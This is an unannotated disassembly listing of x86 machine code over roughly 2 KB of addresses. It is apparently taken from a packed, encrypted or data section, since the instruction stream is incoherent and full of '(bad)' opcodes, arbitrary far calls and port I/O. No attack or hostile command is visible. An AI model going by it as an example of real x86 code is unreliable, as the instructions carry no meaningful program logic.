  413361:	mov    ebp,0x711500df
  413366:	pop    ebp
  413367:	push   es
  413368:	dec    ebx
  413369:	outs   dx,DWORD PTR ds:[esi]
  41336a:	xor    ecx,esi
  41336c:	aad    0xa4
  41336e:	test   eax,0x651184c6
  413373:	(bad)  
  413374:	sahf   
  413375:	jne    0x4133bd
  413377:	addr16 out 0x71,al
  41337a:	lds    eax,FWORD PTR [ebx+0x4efde2e5]
  413380:	fiadd  WORD PTR [eax+0xb]
  413383:	retf   
  413384:	shr    esp,0xb5
  413387:	mov    eax,ds:0x146ca51
  41338c:	cmp    ch,BYTE PTR [esi]
  41338e:	or     bl,BYTE PTR [edi-0x4450d76b]
  413394:	add    ah,BYTE PTR [ebp+0x5e]
  413397:	fst    DWORD PTR [ebp-0x5bb9bd59]
  41339d:	fsubr  QWORD PTR [esp+esi*4-0x17c2e9d5]
  4133a4:	pop    ds
  4133a5:	stc    
  4133a6:	rcl    esp,1
  4133a8:	fdiv   st(3),st
  4133aa:	and    DWORD PTR [edx-0x40],ebx
  4133ad:	jecxz  0x41335b
  4133af:	loop   0x41339c
  4133b1:	retf   
  4133b2:	(bad)  
  4133b3:	adc    cl,ah
  4133b5:	mov    cl,0x28
  4133b7:	fcomp  QWORD PTR [edx]
  4133b9:	es cmp eax,0xa127e785
  4133bf:	std    
  4133c0:	div    BYTE PTR [edx+0x5c]
  4133c3:	jns    0x4133d2
  4133c5:	shl    DWORD PTR [edx+0x9a14b65],0x23
  4133cc:	aaa    
  4133cd:	ds nop
  4133cf:	sti    
  4133d0:	stc    
  4133d1:	call   0x7aa77df7
  4133d6:	jle    0x41341b
  4133d8:	int3   
  4133d9:	imul   BYTE PTR [eax]
  4133db:	std    
  4133dc:	shl    BYTE PTR [edx+0x30c4274d],0xd4
  4133e3:	xchg   edi,eax
  4133e4:	dec    esi
  4133e5:	cmp    ebp,DWORD PTR [edx+ebx*1-0xac2f9da]
  4133ec:	sbb    eax,0x6814840a
  4133f1:	jb     0x413386
  4133f3:	mov    bh,0x78
  4133f5:	stos   BYTE PTR es:[edi],al
  4133f6:	cmp    al,BYTE PTR [edx]
  4133f8:	popa   
  4133f9:	sar    BYTE PTR [ecx],0x8c
  4133fc:	push   ss
  4133fd:	das    
  4133fe:	dec    edi
  4133ff:	cmp    DWORD PTR [eax-0xa5f4819],edx
  413405:	or     ch,bl
  413407:	jge    0x41346e
  413409:	popa   
  41340a:	test   BYTE PTR ds:0xd5241c3a,cl
  413410:	sbb    eax,0x70dc71bf
  413415:	push   edi
  413416:	cmp    BYTE PTR [ecx-0x4f],bh
  413419:	call   0x55de:0x365bac23
  413420:	xchg   ebx,eax
  413421:	call   0x71a6:0x27b71a9c
  413428:	xchg   esi,eax
  413429:	adc    BYTE PTR [eax],0x3
  41342c:	mov    es,WORD PTR [esp+ebp*4+0x1b909e2e]
  413433:	inc    esp
  413434:	mov    ecx,0xbadc71d7
  413439:	dec    esi
  41343a:	test   ebp,eax
  41343c:	sbb    esp,DWORD PTR [ecx+0x5f]
  41343f:	add    esp,DWORD PTR [esi-0x63]
  413442:	sbb    edi,DWORD PTR [ebx-0x4ca44a83]
  413448:	sahf   
  413449:	pushf  
  41344a:	(bad)  
  41344b:	aam    0xbb
  41344d:	and    ah,BYTE PTR [eax-0x43]
  413450:	push   ebx
  413451:	bound  edx,QWORD PTR [edx+ebp*1]
  413454:	sti    
  413455:	jge    0x413482
  413457:	out    0x8e,eax
  413459:	jbe    0x41347d
  41345b:	(bad)  
  41345c:	fmul   st,st(5)
  41345e:	adc    dl,BYTE PTR [ecx+0x14]
  413461:	shl    BYTE PTR [ecx],1
  413463:	bnd jmp 0x41346f
  413466:	pop    ebx
  413467:	ins    BYTE PTR es:[edi],dx
  413468:	dec    ebx
  413469:	cmp    al,0xa2
  41346b:	ins    DWORD PTR es:[edi],dx
  41346c:	rcr    BYTE PTR [ebx],1
  41346e:	rol    DWORD PTR ds:0xc9ac9632,cl
  413474:	fsubr  QWORD PTR [ebp-0x7478e7f1]
  41347a:	mov    ebx,0xd7658b43
  41347f:	mov    dh,BYTE PTR [edi+0x24b0823]
  413485:	aas    
  413486:	int    0x67
  413488:	cwde   
  413489:	sti    
  41348a:	lock adc eax,0x9f0e5b91
  413490:	sub    BYTE PTR [esi+0x12],dh
  413493:	xchg   esp,eax
  413494:	add    al,0xff
  413496:	pop    ss
  413497:	clc    
  413498:	sbb    DWORD PTR ds:0x256ea3f,ebp
  41349e:	cwde   
  41349f:	xchg   ebx,eax
  4134a0:	dec    eax
  4134a1:	cdq    
  4134a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4134a3:	jb     0x41343c
  4134a5:	inc    ebp
  4134a6:	push   eax
  4134a7:	push   eax
  4134a8:	mov    dh,BYTE PTR [ebp+0x4cfbbcbb]
  4134ae:	dec    ebp
  4134af:	mov    edx,0xb8ec0359
  4134b4:	sahf   
  4134b5:	mov    edi,0xe09a653a
  4134ba:	fs in  al,0x27
  4134bd:	inc    ebx
  4134be:	mov    esi,0xef8e3a09
  4134c3:	test   DWORD PTR [ecx+eax*4-0x71],0x3903a3fa
  4134cb:	mov    ch,0x5
  4134cd:	mov    al,ds:0x12067c8e
  4134d2:	in     al,0x18
  4134d4:	inc    esp
  4134d5:	aad    0xd
  4134d7:	or     ecx,DWORD PTR [ecx+0x56]
  4134da:	jl     0x4134bb
  4134dc:	pusha  
  4134dd:	sub    dl,BYTE PTR [ecx+0x6e]
  4134e0:	call   FWORD PTR [edi]
  4134e2:	repnz nop
  4134e4:	std    
  4134e5:	sub    eax,0x4997a965
  4134ea:	mov    cl,0xe6
  4134ec:	(bad)  
  4134ed:	adc    bl,BYTE PTR [esp+ebx*4]
  4134f0:	sti    
  4134f1:	jge    0x4134ca
  4134f3:	test   al,0x42
  4134f5:	dec    ebp
  4134f6:	and    al,dl
  4134f8:	out    dx,al
  4134f9:	mov    cl,0x81
  4134fb:	sub    bl,BYTE PTR [eax]
  4134fd:	cli    
  4134fe:	jmp    0xa9a:0xd9d05ea3
  413505:	and    esi,eax
  413507:	(bad)  
  413508:	aas    
  413509:	faddp  st(4),st
  41350b:	lods   eax,DWORD PTR ds:[esi]
  41350c:	(bad)  
  41350d:	idiv   DWORD PTR es:[edi-0x3c65d2db]
  413514:	xor    ah,BYTE PTR [ecx+ebp*4]
  413517:	inc    ecx
  413518:	shl    al,cl
  41351a:	pop    edi
  41351b:	int    0xd7
  41351d:	xor    edi,ebp
  41351f:	into   
  413520:	repnz lods eax,DWORD PTR ds:[esi]
  413522:	xchg   BYTE PTR [esi],dl
  413524:	loopne 0x4134e7
  413526:	mov    ebx,fs
  413528:	inc    ecx
  413529:	jnp    0x41359a
  41352b:	dec    esi
  41352c:	pop    eax
  41352d:	loopne 0x413545
  41352f:	push   esp
  413530:	fwait
  413531:	cmp    BYTE PTR [edi+esi*2+0x1d],0xc9
  413536:	fistp  DWORD PTR [edx]
  413538:	dec    ebp
  413539:	xchg   BYTE PTR [esi+0xd],dl
  41353c:	and    DWORD PTR [esi],edx
  41353e:	sbb    eax,0x715872f5
  413543:	mov    eax,ds:0x427f7e9f
  413548:	and    eax,0x75153d7a
  41354d:	test   eax,0xe728da38
  413552:	inc    edi
  413553:	stos   BYTE PTR es:[edi],al
  413554:	cmp    esi,ebx
  413556:	cmp    dh,BYTE PTR [edx-0x129795b]
  41355c:	or     DWORD PTR [ebx+ebx*2+0x45b69a04],ebx
  413563:	xchg   ebx,eax
  413564:	xchg   esi,eax
  413565:	push   edx
  413566:	int    0xe7
  413568:	aas    
  413569:	retf   0x5c4c
  41356c:	mov    bh,0xfb
  41356e:	aas    
  41356f:	mov    DWORD PTR [edi+0x46df38af],eax
  413575:	mov    ecx,0xd4e7326d
  41357a:	sub    esp,DWORD PTR [esi]
  41357c:	inc    ebx
  41357d:	pop    ss
  41357e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41357f:	call   0x1368:0x1ce72c6e
  413586:	add    eax,0xfe1a9041
  41358b:	push   ss
  41358c:	test   eax,0x72b71608
  413591:	sub    DWORD PTR cs:[edx],ebx
  413594:	pop    edx
  413595:	cld    
  413596:	jmp    0x7cd574c1
  41359b:	push   ds
  41359c:	fwait
  41359d:	jo     0x413567
  41359f:	mov    eax,0xcab3f8af
  4135a4:	mov    ebx,DWORD PTR [ecx-0x28b60863]
  4135aa:	xor    BYTE PTR [edi],0x36
  4135ad:	pop    ecx
  4135ae:	or     al,0xc0
  4135b0:	cwde   
  4135b1:	or     cl,BYTE PTR [edi-0x26b867c6]
  4135b7:	xlat   BYTE PTR ds:[ebx]
  4135b8:	jge    0x41357f
  4135ba:	ret    0x3a35
  4135bd:	bound  eax,QWORD PTR [edi-0x7c]
  4135c0:	je     0x413636
  4135c2:	or     ebp,DWORD PTR [edx-0x6e]
  4135c5:	(bad)  
  4135c6:	int    0x59
  4135c8:	ss into 
  4135ca:	adc    al,0xb5
  4135cc:	popa   
  4135cd:	dec    edi
  4135ce:	xchg   edx,eax
  4135cf:	rol    BYTE PTR [eax+0x5465e4d2],cl
  4135d5:	(bad)  
  4135d6:	mov    bl,0x3b
  4135d8:	jne    0x4135d2
  4135da:	xchg   edi,eax
  4135db:	repnz xor esi,ebp
  4135de:	out    0xfb,al
  4135e0:	retf   
  4135e1:	mov    ds,WORD PTR [ebx]
  4135e3:	rol    al,0x54
  4135e6:	mov    eax,0xf7b79ac5
  4135eb:	call   0xf8570236
  4135f0:	add    eax,0xab9a3cb
  4135f5:	in     eax,dx
  4135f6:	xor    al,0x17
  4135f8:	out    0x1e,al
  4135fa:	sbb    DWORD PTR [esi-0x1f2598f0],edi
  413600:	mov    es,WORD PTR [esi-0x6fe0a01f]
  413606:	mov    ebp,DWORD PTR ds:[eax+0x22]
  41360a:	dec    edi
  41360b:	mov    DWORD PTR [ebx],esi
  41360d:	and    DWORD PTR [ebx+edi*2+0x506df7df],ecx
  413614:	jp     0x41368b
  413616:	ss pusha 
  413618:	pop    esi
  413619:	enter  0x5ab5,0x7a
  41361d:	xchg   ecx,ebx
  41361f:	cdq    
  413620:	das    
  413621:	les    esi,FWORD PTR [edi]
  413623:	mov    bl,0x10
  413625:	mov    al,dh
  413627:	adc    eax,eax
  413629:	stos   BYTE PTR es:[edi],al
  41362a:	popa   
  41362b:	jge    0x413611
  41362d:	pop    edi
  41362e:	and    ch,BYTE PTR [edx+0x679cef79]
  413634:	push   es
  413635:	stc    
  413636:	xor    ecx,eax
  413638:	mov    eax,ds:0x97319db4
  41363d:	lods   al,BYTE PTR ds:[esi]
  41363e:	rep ins BYTE PTR es:[edi],dx
  413640:	loopne 0x413604
  413642:	shl    DWORD PTR ds:0xf168ccba,0xbc
  413649:	das    
  41364a:	repz mov ebp,0x2dda989b
  413650:	xchg   esi,eax
  413651:	fst    st(3)
  413653:	add    BYTE PTR [eax-0x56],ah
  413656:	adc    BYTE PTR [ecx],al
  413658:	xchg   esp,eax
  413659:	xor    edi,DWORD PTR [ecx]
  41365b:	push   esi
  41365c:	std    
  41365d:	jb     0x4135e8
  41365f:	sahf   
  413660:	jge    0x4135e3
  413662:	pop    es
  413663:	enter  0x59a7,0x21
  413667:	sbb    ah,0xd0
  41366a:	push   es
  41366b:	inc    ebx
  41366c:	cwde   
  41366d:	mov    gs,WORD PTR [ecx]
  41366f:	repz adc DWORD PTR [ebp+0x58a626ad],edi
  413676:	arpl   WORD PTR [edx+0x319f71],sp
  41367c:	sub    al,0xb6
  41367e:	popw   ds
  413680:	retf   0x447d
  413683:	fisubr DWORD PTR [esi]
  413685:	shr    BYTE PTR [edi-0x8b512c7],1
  41368b:	mov    dl,0xc7
  41368d:	ret    0x669c
  413690:	mov    ds:0x5f443ea3,eax
  413695:	mov    cl,0x7b
  413697:	fcomp  st(1)
  413699:	pop    edi
  41369a:	(bad)  
  41369b:	mov    edx,0xb99f2eea
  4136a0:	lahf   
  4136a1:	idiv   DWORD PTR [ebx+edx*2-0x77]
  4136a5:	inc    esi
  4136a6:	push   ebx
  4136a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4136a8:	adc    al,0xf3
  4136aa:	dec    ebp
  4136ab:	jecxz  0x4136fe
  4136ad:	(bad)  
  4136ae:	repz jae 0x4136c1
  4136b1:	lds    ecx,FWORD PTR [edi-0x59]
  4136b4:	xor    BYTE PTR ds:0x6c99875,bl
  4136ba:	or     al,0x9e
  4136bc:	push   eax
  4136bd:	adc    al,0x9b
  4136bf:	in     al,0xcd
  4136c1:	fidivr DWORD PTR [ebp+0x6ff8096c]
  4136c7:	xchg   ebp,eax
  4136c8:	and    al,0x69
  4136ca:	pop    ecx
  4136cb:	xchg   ecx,eax
  4136cc:	(bad)  
  4136cd:	adc    eax,0x60448cfc
  4136d2:	or     BYTE PTR [ecx-0x29],cl
  4136d5:	or     al,0xc2
  4136d7:	fmul   QWORD PTR [ebx-0x5]
  4136da:	push   ebp
  4136db:	mov    esi,0x97d59d32
  4136e0:	fptan  
  4136e2:	push   ebx
  4136e3:	jp     0x4136ab
  4136e5:	xchg   ebp,eax
  4136e6:	mov    eax,0x8ab675bf
  4136eb:	enter  0x67ad,0xd0
  4136ef:	mov    dl,0xaf
  4136f1:	add    DWORD PTR [edx-0x6d5e3b82],ebp
  4136f7:	pop    edx
  4136f8:	add    ah,BYTE PTR [esi+0x7b0c09a6]
  4136fe:	adc    esi,DWORD PTR [edi]
  413700:	jmp    0xa557:0x3265e456
  413707:	loop   0x41372c
  413709:	xor    al,BYTE PTR [eiz*4-0x6a6369ba]
  413710:	cmp    dl,0x9d
  413713:	imul   edi,DWORD PTR [edx],0x46de2dbb
  413719:	sbb    eax,0x1c2cc050
  41371e:	inc    esp
  41371f:	jmp    0x413712
  413721:	retf   
  413722:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413723:	lea    ecx,[ebp-0x5fa126b9]
  413729:	xor    eax,0x4cfe12bc
  41372e:	scas   eax,DWORD PTR es:[edi]
  41372f:	cmp    BYTE PTR [ecx-0x52cd705f],dl
  413735:	fwait
  413736:	push   0xc0a325b4
  41373b:	pop    edx
  41373c:	inc    ebx
  41373d:	cli    
  41373e:	fadd   st,st(6)
  413740:	call   0xa2510bbf
  413745:	and    al,0xdc
  413747:	sbb    eax,0xf3ef5e0e
  41374c:	push   esp
  41374d:	jbe    0x413743
  41374f:	inc    esi
  413750:	add    eax,0x4f2c2983
  413755:	aas    
  413756:	addr16 pop edx
  413758:	ret    
  413759:	jecxz  0x4136f5
  41375b:	pop    esp
  41375c:	retf   0x169e
  41375f:	add    BYTE PTR [esi],0x7e
  413762:	mov    ebp,0x6c383fd8
  413767:	sti    
  413768:	xchg   BYTE PTR [ecx-0x20903d0a],bh
  41376e:	leave  
  41376f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413770:	adc    eax,0xd59b58dd
  413775:	sbb    al,0xf8
  413777:	and    al,0xaf
  413779:	or     eax,0xca9c59d
  41377e:	mov    edi,0x97d797d8
  413783:	lea    ebx,[eax+0x33097808]
  413789:	or     BYTE PTR [ecx],bl
  41378b:	mov    ebp,0x1b6d4011
  413790:	dec    edx
  413791:	(bad)  
  413792:	and    al,0x53
  413794:	adc    al,0xfd
  413796:	out    0xd0,al
  413798:	dec    ecx
  413799:	ret    0xb161
  41379c:	icebp  
  41379d:	dec    edi
  41379e:	sbb    al,BYTE PTR [ecx-0x745bfde0]
  4137a4:	(bad)  
  4137a5:	pop    ecx
  4137a6:	push   0x9060af64
  4137ab:	xchg   ecx,eax
  4137ac:	adc    BYTE PTR [edx],dh
  4137ae:	ins    BYTE PTR es:[edi],dx
  4137af:	loopne 0x4137dc
  4137b1:	xor    al,0x6e
  4137b3:	(bad)  
  4137b4:	in     eax,0x26
  4137b6:	repz jns 0x413761
  4137b9:	pop    es
  4137ba:	dec    esi
  4137bb:	mov    BYTE PTR [edi+0x2d],bh
  4137be:	fsubr  st,st(0)
  4137c0:	ficom  WORD PTR [ebx]
  4137c2:	(bad)  
  4137c4:	jmp    0x9048cea
  4137c9:	icebp  
  4137ca:	mov    ebx,0xcbe9b7c2
  4137cf:	push   0xf003e754
  4137d4:	fwait
  4137d5:	pop    es
  4137d6:	mov    ds:0x7097bc6b,al
  4137db:	aaa    
  4137dc:	aam    0xbe
  4137de:	cmp    al,0x34
  4137e0:	scas   eax,DWORD PTR es:[edi]
  4137e1:	pop    es
  4137e2:	into   
  4137e3:	cmp    al,al
  4137e5:	mov    ecx,0xc2f98c8d
  4137ea:	pop    esp
  4137eb:	inc    eax
  4137ec:	dec    eax
  4137ed:	jae    0x413812
  4137ef:	outs   dx,BYTE PTR ds:[esi]
  4137f0:	inc    edx
  4137f1:	stos   BYTE PTR es:[edi],al
  4137f2:	inc    esi
  4137f3:	pop    ecx
  4137f4:	inc    esp
  4137f5:	int    0x68
  4137f7:	mov    ebx,0xe31a89cf
  4137fc:	cdq    
  4137fd:	aaa    
  4137fe:	sub    ch,bh
  413800:	mov    esi,0x371dfdb6
  413805:	pop    ecx
  413806:	ja     0x413800
  413808:	or     DWORD PTR [ebx],esi
  41380a:	dec    edi
  41380b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41380c:	loopne 0x413876
  41380e:	stos   DWORD PTR es:[edi],eax
  41380f:	dec    esi
  413810:	data16 add al,0x54
  413813:	cmp    al,0xdd
  413815:	ins    DWORD PTR es:[edi],dx
  413816:	pop    edx
  413817:	push   esi
  413818:	dec    eax
  413819:	cmp    eax,0x82514f3b
  41381e:	xor    al,0x49
  413820:	js     0x413816
  413822:	retf   0x4b80
  413825:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413826:	clc    
  413827:	sti    
  413828:	and    dl,BYTE PTR [esi+0x17]
  41382b:	(bad)  
  41382c:	pop    edx
  41382d:	jbe    0x413846
  41382f:	add    dh,BYTE PTR [ecx+0x7e]
  413832:	ret    
  413833:	stc    
  413834:	loopne 0x413831
  413836:	xor    al,0x7c
  413838:	enter  0x7459,0xfa
  41383c:	icebp  
  41383d:	fcmovu st,st(2)
  41383f:	cwde   
  413840:	out    dx,eax
  413841:	retf   0x208a
  413844:	xchg   ecx,eax
  413845:	push   edx
  413846:	push   0x42217721
  41384b:	or     al,0x2c
  41384d:	jmp    0x5e99:0xfc5b9caf
  413854:	push   cs
  413855:	xchg   esp,eax
  413856:	retf   0xc719
  413859:	jp     0x41385c
  41385b:	mov    edx,edx
  41385d:	(bad)  
  41385e:	call   0x6dce:0x461cd7d6
  413865:	cwde   
  413866:	fidivr WORD PTR [eax-0x7]
  413869:	pop    es
  41386a:	dec    BYTE PTR [eax-0x507dc6c3]
  413870:	mov    esi,0x28e42882
  413875:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413876:	mov    ebx,0x225ed6b5
  41387b:	cmp    eax,0x769323ff
  413880:	sbb    edx,DWORD PTR [edi-0x537cbe7d]
  413886:	and    bl,cl
  413888:	mov    dh,0x6a
  41388a:	or     dh,cl
  41388c:	jne    0x41389b
  41388e:	xor    al,ch
  413890:	mov    edx,0x2a2df6df
  413895:	mov    DWORD PTR [esi+0x27],ebp
  413898:	mul    DWORD PTR [edx-0x334aaaba]
  41389e:	xor    ch,dl
  4138a0:	xchg   ebp,eax
  4138a1:	inc    edx
  4138a2:	call   0x657bb525
  4138a7:	icebp  
  4138a8:	cmp    dh,BYTE PTR [ecx+0x35e7fcc1]
  4138ae:	mov    eax,ds:0x7645567f
  4138b3:	sbb    cl,dh
  4138b5:	mov    ah,0x42
  4138b7:	call   DWORD PTR [edi]
  4138b9:	cmp    eax,0xcc6ffd70
  4138be:	push   esp
  4138bf:	ja     0x4138a1
  4138c1:	es push ds
  4138c3:	and    DWORD PTR [esi],ebx
  4138c5:	ins    DWORD PTR es:[edi],dx
  4138c6:	loope  0x4138ca
  4138c8:	pop    ds
  4138c9:	out    0xc,al
  4138cb:	inc    esp
  4138cc:	mov    BYTE PTR [esi],dl
  4138ce:	mov    bl,0xb1
  4138d0:	js     0x413860
  4138d2:	shr    DWORD PTR [edi+0xc],1
  4138d5:	fsubr  st(5),st
  4138d7:	cmp    eax,0x9c9d291c
  4138dc:	fs ins DWORD PTR es:[edi],dx
  4138de:	imul   esp,DWORD PTR [edi],0xe7498a54
  4138e4:	test   DWORD PTR [esi+edx*8],ecx
  4138e7:	(bad)  
  4138e8:	xlat   BYTE PTR ds:[ebx]
  4138e9:	cs inc edi
  4138eb:	cmp    ebp,DWORD PTR [edx+0x6c]
  4138ee:	data16 daa 
  4138f0:	inc    edi
  4138f1:	or     bl,BYTE PTR [esi]
  4138f3:	push   ebx
  4138f4:	xor    ebx,DWORD PTR ds:0x3c655c40
  4138fa:	int    0xdf
  4138fc:	xor    bh,BYTE PTR [esi-0xec2f811]
  413902:	out    dx,eax
  413903:	push   cs
  413904:	out    dx,al
  413905:	lea    edx,[eax+ebp*2]
  413908:	sahf   
  413909:	sbb    cl,BYTE PTR [eax+0xe]
  41390c:	cmp    eax,0x490de833
  413911:	xlat   BYTE PTR ds:[ebx]
  413912:	test   DWORD PTR [esi-0x19],esi
  413915:	inc    ecx
  413916:	and    BYTE PTR [esi-0x17f9c8df],al
  41391c:	add    DWORD PTR [edi+0x59],esp
  41391f:	mov    dh,0x6e
  413921:	fadd   st,st(3)
  413923:	inc    esp
  413924:	sbb    DWORD PTR [eax-0x56],edx
  413927:	(bad)  
  413928:	xor    esi,DWORD PTR [ecx+ecx*8-0x5e]
  41392c:	mul    BYTE PTR [ecx+0x56]
  41392f:	fidiv  WORD PTR [edx-0x5c22abe2]
  413935:	ret    0x68ff
  413938:	enter  0xce89,0xc3
  41393c:	mov    bh,0xfa
  41393e:	(bad)  
  41393f:	mov    edi,0x7e9fa876
  413944:	fsubr  st(1),st
  413946:	cmp    eax,0x63fd984f
  41394b:	mov    DWORD PTR [esi*4+0x65fccb52],0xab735f72
  413956:	loope  0x41391e
  413958:	outs   dx,DWORD PTR ds:[esi]
  413959:	push   ss
  41395a:	jns    0x41398d
  41395c:	retf   0x34cb
  41395f:	inc    edx
  413960:	add    DWORD PTR [ecx],esi
  413962:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413963:	jp     0x4139c3
  413965:	add    al,BYTE PTR [esi+0x1ce988ed]
  41396b:	adc    BYTE PTR [edi+0x26],dh
  41396e:	pop    ds
  41396f:	ja     0x4139d4
  413971:	mul    DWORD PTR ds:0x17a87618
  413977:	inc    eax
  413978:	mov    dh,0x40
  41397a:	test   ebx,ecx
  41397c:	inc    ecx
  41397d:	cmp    bh,BYTE PTR [ebp+0x5f911056]
  413983:	cmp    edx,0xffffff8f
  413986:	scas   al,BYTE PTR es:[edi]
  413987:	or     ah,BYTE PTR [ebp-0xa353d09]
  41398d:	repz xchg ebp,eax
  41398f:	lods   eax,DWORD PTR ds:[esi]
  413990:	pushf  
  413991:	retf   
  413992:	mov    bl,0xae
  413994:	sbb    bl,bl
  413996:	pushw  0xadb8
  41399a:	add    DWORD PTR [ecx+edx*1-0x1cb034f],ebp
  4139a1:	ror    BYTE PTR [eax+0x23],cl
  4139a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4139a5:	es and al,0x94
  4139a8:	jo     0x413938
  4139aa:	cwde   
  4139ab:	bound  ebp,QWORD PTR [ecx-0x53]
  4139ae:	rcl    BYTE PTR [ecx+0x56],1
  4139b1:	pushf  
  4139b2:	in     al,dx
  4139b3:	mov    BYTE PTR ds:0xf2f9e14c,dl
  4139b9:	xor    edx,ebx
  4139bb:	sbb    al,0x95
  4139bd:	in     al,0x51
  4139bf:	jo     0x41397e
  4139c1:	js     0x41394a
  4139c3:	pop    edi
  4139c4:	(bad)  
  4139c5:	pop    edx
  4139c6:	sub    al,0xb8
  4139c8:	pop    esi
  4139c9:	dec    esp
  4139ca:	push   ds
  4139cb:	dec    ebx
  4139cc:	popf   
  4139cd:	fdivr  QWORD PTR [esi-0x11]
  4139d0:	push   es
  4139d1:	cmp    BYTE PTR [ebx+0x2e1e4ccc],0x5b
  4139d8:	addr16 js 0x413a56
  4139db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4139dc:	adc    eax,0x80d63e10
  4139e1:	les    esi,FWORD PTR [edi+0x4d]
  4139e4:	xchg   ecx,eax
  4139e5:	mov    esp,0x4580a056
  4139ea:	std    
  4139eb:	das    
  4139ec:	leave  
  4139ed:	add    al,0x2f
  4139ef:	popa   
  4139f0:	and    dl,cl
  4139f2:	adc    esp,DWORD PTR [eax]
  4139f4:	dec    edi
  4139f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4139f6:	lea    edi,[ecx-0x76]
  4139f9:	mov    BYTE PTR [edx],dl
  4139fb:	sbb    BYTE PTR [ebx+edi*4+0x1ea0a4f8],cl
  413a02:	sub    eax,esi
  413a04:	call   0xea7332e4
  413a09:	or     DWORD PTR [edx+0x583d3199],0x73
  413a10:	mov    ebx,DWORD PTR [edi]
  413a12:	or     esp,esi
  413a14:	sub    al,BYTE PTR [eax+edx*2+0x72]
  413a18:	mov    al,ds:0xcb992d57
  413a1d:	or     eax,0x6de7cf09
  413a22:	(bad)  [esi-0x970e158]
  413a28:	retf   0xf85a
  413a2b:	das    
  413a2c:	js     0x413a61
  413a2e:	fld    st(6)
  413a30:	cmp    BYTE PTR [eax+0x6fec20f0],0x8a
  413a37:	fwait
  413a38:	data16 jmp 0x413a08
  413a3b:	(bad)  
  413a3c:	in     al,0xbf
  413a3e:	call   0x3808cb56
  413a43:	scas   eax,DWORD PTR es:[edi]
  413a44:	or     BYTE PTR [esp+edi*1-0x65],dl
  413a48:	mov    edx,0xa7b56f2d
  413a4d:	cmp    eax,0x6cf262b7
  413a52:	out    0xcb,eax
  413a54:	lock or DWORD PTR ds:0x5ef88fdb,esi
  413a5b:	or     DWORD PTR [eax],eax
  413a5d:	aas    
  413a5e:	jno    0x413aad
  413a60:	or     esp,DWORD PTR [ebp+0x798827ae]
  413a66:	rol    BYTE PTR [eax],0x4c
  413a69:	sub    eax,0xdee34fa3
  413a6e:	pop    eax
  413a6f:	ror    esp,cl
  413a71:	ins    DWORD PTR es:[edi],dx
  413a72:	into   
  413a73:	gs jo  0x413a84
  413a76:	dec    eax
  413a77:	retf   
  413a78:	mov    ecx,0x604bea19
  413a7d:	mov    cl,0xbc
  413a7f:	imul   eax,eax,0x1b
  413a82:	sbb    al,0xba
  413a84:	and    edx,esp
  413a86:	clc    
  413a87:	jne    0x413a28
  413a89:	cdq    
  413a8a:	rcl    BYTE PTR [ebx+0x1a],1
  413a8d:	and    ecx,edi
  413a8f:	and    al,0x1
  413a91:	ja     0x413a1f
  413a93:	in     al,0xf1
  413a95:	xor    al,0xe9
  413a97:	aaa    
  413a98:	dec    edx
  413a99:	imul   edi,edx,0xffffffee
  413a9c:	jecxz  0x413ad3
  413a9e:	xor    DWORD PTR [edi+0x2f],eax
  413aa1:	push   0x40
  413aa3:	aam    0x18
  413aa5:	mov    esi,0xea059f9b
  413aaa:	sbb    DWORD PTR ds:0xa4c4c542,esi
  413ab0:	(bad)  
  413ab1:	push   ecx
  413ab2:	mov    eax,ds:0x19c58539
  413ab7:	dec    esp
  413ab8:	sub    ch,BYTE PTR ds:0xd8b4aa5f
  413abe:	sbb    esi,ecx
  413ac0:	xchg   ecx,eax
  413ac1:	sbb    ecx,DWORD PTR [ebp+0x61cec9d9]
  413ac7:	mov    dl,al
  413ac9:	inc    edx
  413aca:	enter  0xefe0,0x4c
  413ace:	mov    ah,0x32
  413ad0:	xlat   BYTE PTR ds:[ebx]
  413ad1:	xor    DWORD PTR [ebp+edi*8+0x7a],ebp
  413ad5:	into   
  413ad6:	rol    BYTE PTR [eax],0x88
  413ad9:	imul   ebp,ebp,0xfffffff2
  413adc:	pop    edi
  413add:	dec    ebp
  413ade:	jae    0x413b1b
  413ae0:	sub    dl,BYTE PTR [edi+0x27]
  413ae3:	ret    0x9c38
  413ae6:	or     ah,BYTE PTR [ebp-0x6968711d]
  413aec:	lock jecxz 0x413a90
  413aef:	fwait
  413af0:	push   edi
  413af1:	add    DWORD PTR [edx+0xb645e66],esp
  413af7:	pop    ebx
  413af8:	lock fstp st(4)
  413afb:	jmp    0x3c:0x1a771dbc
  413b02:	jmp    0x72d9:0x7ed9b7d5
  413b09:	inc    esp
  413b0a:	mul    BYTE PTR [ecx+eiz*8+0x48]
  413b0e:	add    al,0x5
  413b10:	lock sti 
  413b12:	push   edi
  413b13:	or     ch,dl
  413b15:	int    0x14
  413b17:	mov    dl,0xb
  413b19:	and    bl,BYTE PTR [eax]
  413b1b:	(bad)  
  413b1c:	iret   
  413b1d:	mov    ah,0x2a
  413b1f:	jno    0x413adf
  413b21:	xor    eax,0x7158c4c1
  413b26:	pop    esi
  413b27:	dec    esi
  413b28:	pop    ebx
  413b29:	imul   ebp,DWORD PTR [edx-0x12],0xba767380
  413b30:	enter  0xd1c0,0xa7
  413b34:	fucom  st(3)
  413b36:	(bad)  
  413b37:	fcmovb st,st(1)
  413b39:	mov    eax,0x92e5e9e8
  413b3e:	in     eax,dx
  413b3f:	cmp    BYTE PTR [edi+0x1efb7705],bh
  413b45:	mov    dh,0x49
  413b47:	loop   0x413b75
  413b49:	ds retf 0x5f04
  413b4d:	and    al,0x8c
  413b4f:	pop    ecx
  413b50:	leave  
  413b51:	xchg   DWORD PTR [eax+0x7f96bb7d],edi
  413b57:	pop    edx
  413b58:	push   0x6c
  413b5a:	inc    ebp
  413b5b:	inc    ebx
  413b5c:	mov    ebx,0x3f54d9c0
  413b61:	xchg   BYTE PTR [ebx+0x6e],ah
  413b64:	dec    ebp
  413b65:	sub    eax,0x751b4ab0
